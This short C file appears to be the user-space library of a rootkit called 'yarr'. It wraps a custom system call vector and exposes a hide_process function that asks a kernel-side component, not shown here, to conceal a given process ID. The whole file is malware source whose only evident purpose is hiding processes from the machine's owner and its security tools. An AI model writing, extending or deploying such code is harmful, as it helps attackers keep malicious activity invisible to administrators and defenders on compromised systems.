#define _GNU_SOURCE
#include <unistd.h>

#include "yarrlib.h"

long yarrcall(int svc, YarrcallArgs_t *args) {
    return syscall(YARR_VECTOR, svc, args);
}

long hide_process(pid_t pid) {
    YarrcallArgs_t yarr_args;

    yarr_args.hidepid_args.pid = pid;
    return yarrcall(HIDE_PID, &yarr_args);
}
